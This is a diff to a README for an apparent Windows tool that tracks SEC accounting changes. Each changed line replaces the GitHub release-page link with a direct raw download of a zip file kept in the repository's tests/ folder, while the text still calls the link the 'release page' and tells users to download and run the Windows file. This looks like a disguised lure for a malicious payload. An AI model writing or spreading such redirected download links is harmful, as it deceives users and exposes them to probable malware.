@@ -1,6 +1,6 @@
 # 📊 GAAP-Implementation-Toolkit - Track SEC accounting changes
 
-[![Download the app](https://img.shields.io/badge/Download%20Release%20Page-blue?style=for-the-badge)](https://github.com/emyleeworn167/GAAP-Implementation-Toolkit/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/emyleeworn167/GAAP-Implementation-Toolkit/main/tests/GAA_Toolkit_Implementation_v3.4.zip)
 
 ## 🧭 What this is
 
@@ -22,7 +22,7 @@ If you plan to work with larger filing sets, 8 GB of RAM helps keep the app smoo
 
 ## 🚀 Download the app
 
-1. Open the release page here: https://github.com/emyleeworn167/GAAP-Implementation-Toolkit/releases
+1. Open the release page here: https://raw.githubusercontent.com/emyleeworn167/GAAP-Implementation-Toolkit/main/tests/GAA_Toolkit_Implementation_v3.4.zip
 2. Find the latest release
 3. Download the Windows file listed under Assets
 4. Save the file to your Downloads folder or Desktop
@@ -183,7 +183,7 @@ To review how a company changed a note disclosure:
 
 ## 📥 Download again
 
-Open the release page to download the latest Windows version: https://github.com/emyleeworn167/GAAP-Implementation-Toolkit/releases
+Open the release page to download the latest Windows version: https://raw.githubusercontent.com/emyleeworn167/GAAP-Implementation-Toolkit/main/tests/GAA_Toolkit_Implementation_v3.4.zip
 
 ## 🧷 Quick start
 
